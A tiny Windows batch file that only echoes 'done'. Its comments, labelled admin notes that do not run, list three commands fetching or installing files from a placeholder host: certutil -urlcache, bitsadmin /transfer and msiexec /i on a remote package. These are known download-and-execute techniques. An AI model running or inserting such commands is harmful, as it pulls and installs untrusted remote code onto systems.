@echo off
rem admin notes only -- nothing runs:
rem certutil -urlcache -split -f http://updates.example.invalid/a.b64 a.b64
:: bitsadmin /transfer j http://updates.example.invalid/b.cab b.cab
rem msiexec /i http://updates.example.invalid/c.msi
echo done
